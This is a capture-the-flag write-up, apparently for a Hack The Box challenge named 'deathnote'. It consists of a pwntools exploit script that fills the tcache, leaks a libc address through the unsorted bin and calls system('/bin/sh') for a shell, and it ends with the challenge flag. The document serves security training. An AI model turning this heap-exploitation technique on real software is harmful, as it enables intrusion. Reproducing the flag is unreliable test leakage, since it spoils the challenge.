# Deathnote

## Solve Script
```
from pwn import *
from ctfkit.bp import *
from ctfkit.calculators import OffsetCalculator

context.binary = 'deathnote'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def prompt(proc, option):
  proc.sendlineafter(b'\xf0\x9f\x92\x80 ', str(option).encode())

def add(proc, size, page, data):
  prompt(proc, 1)
  proc.sendlineafter(b'How big is your request?', str(size).encode())
  proc.sendlineafter(b'Page?', str(page).encode())
  proc.sendlineafter(b'Name of victim:', data)

def delete(proc, page):
  prompt(proc, 2)
  proc.sendlineafter(b'Page?', str(page).encode())

def show(proc, page):
  prompt(proc, 3)
  proc.sendlineafter(b'Page?', str(page).encode())

# addresses
libc_system = 0x50d70

def main():
  proc = get_process()

  # malloc data
  for i in range(9):
    add(proc, 0x80, i, b'temp data')

  # fill up tcache, and create an unsorted bin
  for i in range(8):
    delete(proc, i)

  # leak address from unsorted bin
  show(proc, 7)
  proc.recvuntil(b'content: ')
  leak = proc.readline().strip()
  leak = int.from_bytes(leak, 'little')
  libc_base = OffsetCalculator(0x0, 0x21ace0, leak) # 0x21ace0, libc in main_arena struct

  # map out libc addresses from leak
  map_libc_system = libc_base.get(libc_system)
  map_libc_base = libc_base.get_base()

  # call system(/bin/sh)
  add(proc, 0x80, 0, hex(map_libc_system).encode())
  add(proc, 0x80, 1, b'/bin/sh\x00')
  prompt(proc, 42)
  proc.interactive()

if __name__ == '__main__':
  parse_args()
  main()
```

Flag: HTB{0m43_w4_m0u_5h1nd31ru~uWu}